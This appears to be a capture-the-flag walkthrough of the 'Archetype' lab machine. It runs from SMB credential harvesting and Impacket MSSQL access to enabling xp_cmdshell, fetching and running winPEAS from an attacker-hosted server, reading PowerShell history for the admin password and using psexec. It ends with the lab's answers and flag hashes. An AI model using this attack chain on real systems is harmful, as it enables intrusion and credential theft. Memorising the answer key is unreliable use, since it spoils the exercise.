# Archetype - Very Easy

```shell
nmap -Pn -T4 -A 10.129.133.189

smbclient -L //10.129.133.189
#lists shares

smbclient //10.129.133.189/backups
#connect with share

ls

get prod.dtsConfig

quit

cat prod.dtsConfig
#view file from share
#this contains the password required

ls /opt/impacket/examples

less /opt/impacket/examples/mssqlclient.py

python3 /opt/impacket/examples/mssqlclient.py

python3 /opt/impacket/examples/mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.133.189 -windows-auth
#connects to SQL server

xp_cmdshell
#shows that it is off
#we have to configure it first

EXEC sp_configure 'show advanced options', 1

RECONFIGURE

EXEC sp_configure 'xp_cmdshell', 1

RECONFIGURE

EXEC xp_cmdshell 'dir';
#to test if it works
#we can run commands now

EXEC xp_cmdshell 'dir C:\Users\sql_svc';

EXEC xp_cmdshell 'dir C:\Users\sql_svc\Desktop';

EXEC xp_cmdshell 'type C:\Users\sql_svc\Desktop\user.txt';
#we get user flag
#we can try executing winpeas script now

#in attacker machine
#in directory containing winPEAS script
python3 -m http.server
#sets server

#to get winpeas script, we can use powershell
EXEC xp_cmdshell 'powershell -c pwd';
#check if powershell works

EXEC xp_cmdshell 'powershell -c cd C:\Users\sql_svc; wget http://10.10.15.128:8000/winPEASx64.exe -outfile winpeas.exe';
#we have winpeas script

EXEC xp_cmdshell 'powershell -c C:\Users\sql_svc\winpeas.exe';
#we have to go through the output now

EXEC xp_cmdshell 'powershell -c type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt';
#shows admin password

#we can now escalate and login as admin
python3 /opt/impacket/examples/psexec.py ARCHETYPE/administrator:"MEGACORP_4dm1n\!\!"@10.129.133.189
#we get access

cd C:\Users\Administrator

cd Desktop

type root.txt
```

```markdown
After the Nmap scan, we can use smbclient to check and access the shares for hints.

The file found in the backups share contains the username and password sql_svc:M3g4c0rp123

For the Impacket script, we can view the example scripts provided by Impacket.

Now, we can use mssqlclient.py to spawn Windows command shell using the password found earlier.

We can view the help part for the script and execute the command.

After we get access to SQL server and configure xp_cmdshell, we can run commands.

This includes finding the flags and running script for finding privilege escalation vectors.

The output of the winPEAS script contains hints.

One of the hints we have is that we have a file which contains the admin password.

The PowerShell history file has been highlighted in red, so that could be a clue.

The location of the file is given as 'C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'

The PowerShell history file shows that the credentials are administrator:MEGACORP_4dm1n!!

We can use this to login as administrator using Impacket script psexec.py and find root flag.
```

1. Which TCP port is hosting a database server? - 1433

2. What is the name of the non-Administrative share available over SMB? - backups

3. What is the password identified in the file on the SMB share? - M3g4c0rp123

4. What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server? - mssqlclient.py

5. What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell? - xp_cmdshell

6. What script can be used in order to search possible paths to escalate privileges on Windows hosts? - winPEAS

7. What file contains the administrator's password? - ConsoleHost_history.txt

8. Submit user flag? - 3e7b102e78218e935bf3f4951fec21a3

9. Submit root flag? - b91ccec3305e98240082d4474b848528
